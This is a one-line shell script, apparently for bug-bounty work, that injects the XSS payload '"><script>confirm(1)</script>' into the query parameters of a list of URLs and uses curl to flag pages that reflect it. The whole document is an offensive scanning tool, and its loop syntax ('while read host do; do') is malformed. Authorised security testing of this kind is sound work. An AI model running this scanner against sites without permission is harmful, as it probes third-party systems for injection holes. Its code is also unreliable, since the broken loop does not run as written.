urlsFile=$1
cat $urlsFile | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS REFLECTED HERE $host" ; done
